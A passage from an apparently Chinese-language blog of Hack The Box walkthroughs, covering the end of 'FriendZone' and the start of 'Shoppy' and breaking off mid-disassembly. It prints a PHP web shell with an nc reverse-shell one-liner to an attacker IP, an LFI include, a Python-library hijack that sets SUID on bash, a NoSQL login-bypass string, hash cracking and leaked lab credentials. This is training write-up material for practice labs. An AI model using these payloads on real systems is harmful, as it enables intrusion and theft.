Drivers | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\var\\lib\\samba\\printers | Anonymous access: &lt;none&gt; |_ Current user access: &lt;none&gt; Nmap done: 1 IP address (1 host up) scanned in 95.19 seconds ┌──(root㉿lucifiel)-[~/Desktop] └─# smbclient -N \\\\\\\\10.10.10.123\\\\Development Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; ls . D 0 Tue Sep 20 09:51:26 2022 .. D 0 Tue Sep 13 22:56:24 2022 3545824 blocks of size 1024. 1658488 blocks available 四大常用指令挨个执行一遍，拿到的信息越多越好 Development 文件夹是空的，看看另一个有读取权限的文件夹 ┌──(root㉿lucifiel)-[~/Desktop] └─# smbclient -N \\\\\\\\10.10.10.123\\\\general Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; ls . D 0 Thu Jan 17 04:10:51 2019 .. D 0 Tue Sep 13 22:56:24 2022 creds.txt N 57 Wed Oct 10 07:52:42 2018 3545824 blocks of size 1024. 1658484 blocks available 这边有一个 creds.txt 文件，读取看一下 creds for the admin THING: admin:WORKWORKHhallelujah@# 似乎是一个账号密码 漏洞利用我们回到 Http 页面，会看到有一个邮箱 &#105;&#x6e;&#102;&#111;&#64;&#x66;&#x72;&#105;&#101;&#110;&#100;&#x7a;&#111;&#x6e;&#101;&#112;&#x6f;&#x72;&#x74;&#97;&#x6c;&#46;&#114;&#x65;&#x64; 既然是域名邮箱，那按照常理来说是会存在这个域名的 查看了一下证书，发现确实存在域名，但是是 friendzone.red，去添加一个 hosts 解析 echo 10.10.10.123 friendzone.red &gt;&gt; /etc/hosts ┌──(root㉿lucifiel)-[~/Desktop] └─# dig axfr friendzone.red @10.10.10.123 ; &lt;&lt;&gt;&gt; DiG 9.18.1-1-Debian &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123 ;; global options: +cmd friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red. 604800 IN AAAA ::1 friendzone.red. 604800 IN NS localhost. friendzone.red. 604800 IN A 127.0.0.1 administrator1.friendzone.red. 604800 IN A 127.0.0.1 hr.friendzone.red. 604800 IN A 127.0.0.1 uploads.friendzone.red. 604800 IN A 127.0.0.1 friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 1439 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP) ;; WHEN: Tue Sep 20 10:09:07 CST 2022 ;; XFR size: 8 records (messages 1, bytes 289) 枚举域名信息，发现了三个子域名 administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red 都添加到 hosts https://administrator1.friendzone.red/ 访问后发现是一个登陆页面 使用我们的账号密码进行登录 登陆成功，让我们访问 &#x2F;dashboard.php 大概意思是说，这是一个用于朋友圈的智能照片脚本，但是这是一个初级的 php 开发人员写的代码，然后这个脚本还没经过测试，所以有一个参数被遗忘了，输入这个参数可以现实图片，默认是 image_id&#x3D;a.jpg&amp;pagename&#x3D;timestamp 看到这参数构成，感觉存在 LFI（本地文件包含），然后在之前的 Development 处，感觉有点不对，一个可读写的地址却没有内容，应该是给我们上传的点。然后我们也知道它的绝对路径，去尝试上传到 Development，再去 LFI 读取试试 \\\\10.10.10.123\\Development: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\etc\\Development | Anonymous access: READ/WRITE | Current user access: READ/WRITE &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 4444 &gt;/tmp/f&#39;); ?&gt; 把 shell 写入到 php 文件，然后去上传 ┌──(root㉿lucifiel)-[~/Desktop] └─# smbclient //10.10.10.123/development -U &quot;&quot; Password for [WORKGROUP\\]: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; put shell.php putting file shell.php as \\shell.php (0.1 kb/s) (average 0.1 kb/s) 然后去包含试试 nc -nvlp 4444 https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/shell ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.10.123] 39570 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; www-data@FriendZone:/var/www/admin$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功获得 shel www-data@FriendZone:/home/friend$ cat user.txt cat user.txt a4977797fce2cc139c86af2adc340a29 成功拿到 user 权限的 flag 文件 权限提升Userwww-data@FriendZone:/var/www$ ls ls admin friendzoneportal html uploads friendzone friendzoneportaladmin mysql_data.conf www-data@FriendZone:/var/www$ cat mysql_data.conf cat mysql_data.conf for development process this is the mysql creds for user friend db_user=friend db_pass=Agpyu12!0.213$ db_name=FZ 在登入后的目录找到了一个 mysql_data.conf 文件，里面包含了一些凭证 ww-data@FriendZone:/var/www$ cat /etc/passwd|grep bash cat /etc/passwd|grep bash root:x:0:0:root:/root:/bin/bash friend:x:1000:1000:friend,,,:/home/friend:/bin/bash 可以看到当前也有这个用户，去尝试 ssh 登陆试试 ┌──(root㉿lucifiel)-[~/Desktop] └─# ssh friend@10.10.10.123 The authenticity of host &#39;10.10.10.123 (10.10.10.123)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:ERMyoo9aM0mxdTvIh0kooJS+m3GwJr6Q51AG9/gTYx4. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.123&#39; (ED25519) to the list of known hosts. friend@10.10.10.123&#39;s password: Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage You have mail. Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3 friend@FriendZone:~$ whoami&amp;&amp;id friend uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare) 登入成功 Root使用 pspy64 跑一下 2022/09/20 05:44:01 CMD: UID=0 PID=1417 | /bin/sh -c /opt/server_admin/reporter.py 2022/09/20 05:44:01 CMD: UID=0 PID=1416 | /bin/sh -c /opt/server_admin/reporter.py 发现有一个脚本 &#x2F;opt&#x2F;server_admin&#x2F;reporter.py 一直在运行 friend@FriendZone:~$ ls -la /opt/server_admin/reporter.py -rwxr--r-- 1 root root 424 Jan 16 2019 /opt/server_admin/reporter.py 并且还是 root 权限的 friend@FriendZone:~$ cat /opt/server_admin/reporter.py #!/usr/bin/python import os to_address = &quot;admin1@friendzone.com&quot; from_address = &quot;admin2@friendzone.com&quot; print &quot;[+] Trying to send email to %s&quot;%to_address #command = &#39;&#39;&#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;&#39;&#39;&#39; #os.system(command) # I need to edit the script later # Sam ~ python developer 我们没有写入权限，但是它会导入一个 os 库，咱们去查看一下是否有权限 friend@FriendZone:/usr/lib/python2.7$ ls -la|grep os.py -rwxrwxrwx 1 root root 25910 Jan 15 2019 os.py 咱们是有写入权限的，那就写入一段恶意程序就好了 echo &quot;system(&#39;chmod +s /bin/bash&#39;)&quot; &gt;&gt; os.py friend@FriendZone:/usr/lib/python2.7$ ls -la /bin/bash -rwsr-sr-x 1 root root 1113504 Apr 4 2018 /bin/bash 等待两分钟，看到加上 s 权限后，就可以提权了 friend@FriendZone:/usr/lib/python2.7$ /bin/bash -p bash-4.4# whoami&amp;&amp;id root uid=1000(friend) gid=1000(friend) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(friend) 成功提权到 root 权限 bash-4.4# cat /root/root.txt d93cbc3ed65646042735f3ee312fe2c5 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Shoppy - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Shoppy","date":"2022-09-17T11:38:36.000Z","updated":"2023-06-17T02:28:37.000Z","comments":true,"path":"2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/","link":"","permalink":"http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/","excerpt":"","text":"Hackthebox - Shoppy靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.180 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 20:59 EST Nmap scan report for 10.10.11.180 Host is up (0.25s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA) | 256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA) |_ 256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519) 80/tcp open http nginx 1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb |_http-server-header: nginx/1.23.1 9093/tcp open copycat? | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Thu, 22 Dec 2022 01:59:42 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 2612 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 2612 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=&quot;0&quot;} 4.218e-05 | go_gc_duration_seconds{quantile=&quot;0.25&quot;} 0.000107572 | HTTPOptions: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Thu, 22 Dec 2022 01:59:43 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 2612 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 2612 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=&quot;0&quot;} 4.218e-05 |_ go_gc_duration_seconds{quantile=&quot;0.25&quot;} 0.000107572 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9093-TCP:V=7.93%I=7%D=12/21%Time=63A3BA0E%P=x86_64-pc-linux-gnu%r(G SF:enericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request&quot;)%r(GetRequest,2F0E,&quot;HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type: SF:\\x20text/plain;\\x20version=0\\.0\\.4;\\x20charset=utf-8\\r\\nDate:\\x20Thu,\\x SF:2022\\x20Dec\\x202022\\x2001:59:42\\x20GMT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles SF:_automatic_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\ SF:x20generated\\x20by\\x20the\\x20Go\\x20runtime\\.\\n#\\x20TYPE\\x20go_gc_cycles SF:_automatic_gc_cycles_total\\x20counter\\ngo_gc_cycles_automatic_gc_cycles SF:_total\\x202612\\n#\\x20HELP\\x20go_gc_cycles_forced_gc_cycles_total\\x20Cou SF:nt\\x20of\\x20completed\\x20GC\\x20cycles\\x20forced\\x20by\\x20the\\x20applica SF:tion\\.\\n#\\x20TYPE\\x20go_gc_cycles_forced_gc_cycles_total\\x20counter\\ngo SF:_gc_cycles_forced_gc_cycles_total\\x200\\n#\\x20HELP\\x20go_gc_cycles_total SF:_gc_cycles_total\\x20Count\\x20of\\x20all\\x20completed\\x20GC\\x20cycles\\.\\n SF:#\\x20TYPE\\x20go_gc_cycles_total_gc_cycles_total\\x20counter\\ngo_gc_cycle SF:s_total_gc_cycles_total\\x202612\\n#\\x20HELP\\x20go_gc_duration_seconds\\x2 SF:0A\\x20summary\\x20of\\x20the\\x20pause\\x20duration\\x20of\\x20garbage\\x20col SF:lection\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_duration_seconds\\x20summary\\ngo SF:_gc_duration_seconds{quantile=\\&quot;0\\&quot;}\\x204\\.218e-05\\ngo_gc_duration_seco SF:nds{quantile=\\&quot;0\\.25\\&quot;}\\x200\\.000107572\\ngo_&quot;)%r(HTTPOptions,2A5A,&quot;HTTP SF:/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x20text/plain;\\x20version=0\\.0\\.4;\\ SF:x20charset=utf-8\\r\\nDate:\\x20Thu,\\x2022\\x20Dec\\x202022\\x2001:59:43\\x20G SF:MT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_automatic_gc_cycles_total\\x20Count\\ SF:x20of\\x20completed\\x20GC\\x20cycles\\x20generated\\x20by\\x20the\\x20Go\\x20r SF:untime\\.\\n#\\x20TYPE\\x20go_gc_cycles_automatic_gc_cycles_total\\x20counte SF:r\\ngo_gc_cycles_automatic_gc_cycles_total\\x202612\\n#\\x20HELP\\x20go_gc_c SF:ycles_forced_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycle SF:s\\x20forced\\x20by\\x20the\\x20application\\.\\n#\\x20TYPE\\x20go_gc_cycles_fo SF:rced_gc_cycles_total\\x20counter\\ngo_gc_cycles_forced_gc_cycles_total\\x2 SF:00\\n#\\x20HELP\\x20go_gc_cycles_total_gc_cycles_total\\x20Count\\x20of\\x20a SF:ll\\x20completed\\x20GC\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_cycles_total_gc_c SF:ycles_total\\x20counter\\ngo_gc_cycles_total_gc_cycles_total\\x202612\\n#\\x SF:20HELP\\x20go_gc_duration_seconds\\x20A\\x20summary\\x20of\\x20the\\x20pause\\ SF:x20duration\\x20of\\x20garbage\\x20collection\\x20cycles\\.\\n#\\x20TYPE\\x20go SF:_gc_duration_seconds\\x20summary\\ngo_gc_duration_seconds{quantile=\\&quot;0\\&quot;} SF:\\x204\\.218e-05\\ngo_gc_duration_seconds{quantile=\\&quot;0\\.25\\&quot;}\\x200\\.000107 SF:572\\ngo_&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=12/21%OT=22%CT=1%CU=41733%PV=Y%DS=2%DC=T%G=Y%TM=63A3BA OS:84%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 276.37 ms 10.10.14.1 2 276.85 ms 10.10.11.180 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 150.68 seconds 这里一看就需要做 hosts 解析，我们加进去 echo 10.10.11.180 shoppy.htb &gt;&gt; /etc/hosts Http 似乎是一个什么倒计时，倒计时到了就会推出一个什么版本，咱们做个信息收集先 Fuzz┌──(root㉿kali)-[~/Desktop] └─# ffuf -u &quot;http://shoppy.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://shoppy.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ css [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 291ms] admin [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 314ms] images [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 315ms] js [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 322ms] login [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 339ms] assets [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 278ms] Admin [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 295ms] Login [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 295ms] fonts [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 277ms] ADMIN [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 277ms] exports [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 279ms] [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 279ms] LOGIN [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 288ms] :: Progress: [30000/30000] :: Job [1/1] :: 23 req/sec :: Duration: [0:03:43] :: Errors: 2 :: 经过测试，只有 Login 可以访问，是一个登陆页面 这里可以使用万能密码 admin’||’’&#x3D;&#x3D;&#x3D;’ 进行登陆 登入后是一个价格表，右上角有个查询用户的功能 我们查询万能密码后，会得到两个账户 {&quot;_id&quot;:&quot;62db0e93d6d6a999a66ee67a&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;23c6877d9e2b564ef8b32c3a23de27b2&quot;} {&quot;_id&quot;:&quot;62db0e93d6d6a999a66ee67b&quot;,&quot;username&quot;:&quot;josh&quot;,&quot;password&quot;:&quot;6ebcea65320589ca4f2f1ce039975995&quot;} 漏洞利用把 password 提取出来，丢 hashcat 跑一下 echo &quot;6ebcea65320589ca4f2f1ce039975995&quot; &gt; hash ┌──(root㉿kali)-[~/Desktop] └─# hashcat -m 0 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.0+debian Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================================ * Device #1: pthread-12th Gen Intel(R) Core(TM) i5-12400F, 1438/2940 MB (512 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 INFO: All hashes found as potfile and/or empty entries! Use --show to display them. Started: Wed Dec 21 22:07:00 2022 Stopped: Wed Dec 21 22:07:00 2022 ┌──(root㉿kali)-[~/Desktop] └─# hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show 6ebcea65320589ca4f2f1ce039975995:remembermethisway 这边只有 josh 的账户爆出来了，admin 的无法爆出来 使用这个密码进行 ssh 登陆，是失败的，那就证明还有我们没有发现的地方，这里我们尝试爆破子域名 ┌──(root㉿kali)-[~/Desktop] └─# ffuf -H &quot;Host: FUZZ.shoppy.htb&quot; -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.180 -fs 169 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.180 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.shoppy.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 169 ________________________________________________ mattermost [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 266ms] :: Progress: [100000/100000] :: Job [1/1] :: 150 req/sec :: Duration: [0:11:17] :: Errors: 0 :: 加入到 hosts 解析中 echo 10.10.11.180 mattermost.shoppy.htb &gt;&gt; /etc/hosts 接着去访问一下 是一个登陆界面，用我们刚才破解出来的账号密码去进行登陆 username = josh password = remembermethisway 登陆成功，到处看一下，做一下信息收集 在 Deploy Machine 中，我们看到 jaeger 发布了一个账号密码 username = jaeger password = Sh0ppyBest@pp! 这似乎是一个用 docker 部署的东西，那应该可以使用 ssh 进行登陆 ┌──(root㉿kali)-[~/Desktop] └─# ssh jaeger@10.10.11.180 jaeger@10.10.11.180&#39;s password: Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. jaeger@shoppy:~$ whoami&amp;&amp;id jaeger uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger) 登陆成功 jaeger@shoppy:~$ cat user.txt ff6024ae7ef749b44ac3fbc6ce9df1ce 成功拿到 user 权限的 flag 文件 权限提升Userjaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager 这里发现一个奇怪的文件，我们想办法给他搞出来在本地分析一下 cd /home/deploy/ python3 -m http.server 1234 ┌──(root㉿kali)-[~/Desktop] └─# wget http://10.10.11.180:1234/password-manager --2022-12-22 01:34:58-- http://10.10.11.180:1234/password-manager 正在连接 10.10.11.180:1234... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：18440 (18K) [application/octet-stream] 正在保存至: “password-manager” password-manager 100%[=====================================================================================================================&gt;] 18.01K 63.9KB/s 用时 0.3s 2022-12-22 01:34:59 (63.9 KB/s) - 已保存 “password-manager” [18440/18440]) ┌──(root㉿kali)-[~/Desktop] └─# file password-manager password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped 这是一个 64 位的可执行文件 ┌──(root㉿kali)-[~/Desktop] └─# r2 password-manager Warning: run r2 with -e bin.cache=true to fix relocations in disassembly [0x00001120]&gt; 使用 r2 分析一下 ┌──(root㉿kali)-[~/Desktop] └─# r2 password-manager Warning: run r2 with -e bin.cache=true to fix relocations in disassembly [0x00001120]&gt; aaa [x] Analyze all flags starting with sym. and entry0 (aa) [x] Analyze function calls (aac) [x] Analyze len bytes of instructions for references (aar) [x] Finding and parsing C++ vtables (avrr) [x] Type matching analysis for all functions (aaft) [x] Propagate noreturn information (aanr) [x] Use -AA or aaaa to perform additional experimental analysis. [0x00001120]&gt; afl 0x00001120 1 43 entry0 0x00001150 4 41 -&gt; 34 sym.deregister_tm_clones 0x00001180 4 57 -&gt; 51 sym.register_tm_clones 0x000011c0 5 57 -&gt; 50 sym.__do_global_dtors_aux 0x00001110 1 6 sym.imp.__cxa_finalize 0x00001200 1 5 entry.init0 0x000013eb 4 73 sym.__static_initialization_and_destruction_0_int__int_ 0x000010e0 1 6 sym.imp.std::ios_base::Init::Init__ 0x00001060 1 6 sym.imp.__cxa_atexit 0x00001434 1 21 sym._GLOBAL__sub_I_main 0x00001000 3 23 sym._init 0x00001205 5 486 -&gt; 426 main 0x000014b4 1 9 sym._fini 0x00001450 4 93 sym.__libc_csu_init 0x000014b0 1 1 sym.__libc_csu_fini 0x00001030 1 6 sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::compare_std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____const__const 0x00001040 1 6 fcn.00001040 0x00001050 1 6 sym.imp.system 0x00001070 1 6 sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_ 0x00001080 1 6 sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_ 0x00001090 1 6 sym.imp.std::ostream::operator___std::ostream____std::ostream__ 0x000010a0 1 6 fcn.000010a0 0x000010b0 1 6 sym.imp.std::basic_istream_char__std::char_traits_char____std::operator___char__std::char_traits_char___std::allocator_char____std::basic_istream_char__std::char_traits_char_____std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____ 0x000010c0 1 6 sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_ 0x000010d0 1 6 sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string__ 0x000010f0 1 6 sym.imp._Unwind_Resume 0x00001100 1 6 sym.imp.std::allocator_char_::allocator__ 使用函数 aaa 自动分析并命名函数，使用函数 afl 查看程序内的函数 这里找到了 main 函数，然后去到 main 函数的地址并查看汇编代码 [0x00001120]&gt; s main [0x00001205]&gt; pdf ; DATA XREF from entry0 @ 0x113d ┌ 426: int main (int argc, char **argv, char **envp); │ ; var int64_t var_60h @ rbp-0x60 │ ; var int64_t var_40h @ rbp-0x40 │ ; var int64_t var_11h @ rbp-0x11 │ ; var int64_t var_8h @ rbp-0x8 │ 0x00001205 55 push rbp │ 0x00001206 4889e5 mov rbp, rsp │ 0x00001209 53 push rbx │ 0x0000120a 4883ec58 sub rsp, 0x58 │ 0x0000120e 488d35fb0d00. lea rsi, str.Welcome_to_Josh_password_manager_ ; 0x2010 ; &quot;Welcome to Josh password manager!&quot; │ 0x00001215 488d3da42e00. lea rdi, obj.std::cout ; sym..bss │ ; 0x40c0 │ 0x0000121c e85ffeffff call sym std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_ │ 0x00001221 4889c2 mov rdx, rax │ 0x00001224 488b05a52d00. mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0 │ 0x0000122b 4889c6 mov rsi, rax │ 0x0000122e 4889d7 mov rdi, rdx │ 0x00001231 e85afeffff call sym std::ostream::operator&lt;&lt;(std::ostream&amp; (*)(std::ostream&amp;)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__ │ 0x00001236 488d35fb0d00. lea rsi, str.Please_enter_your_master_password:_ ; 0x2038 ; &quot;Please enter your master password: &quot; │ 0x0000123d 488d3d7c2e00. lea rdi, obj.std::cout ; sym..bss │ ; 0x40c0 │ 0x00001244 e837feffff call sym std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*) ; 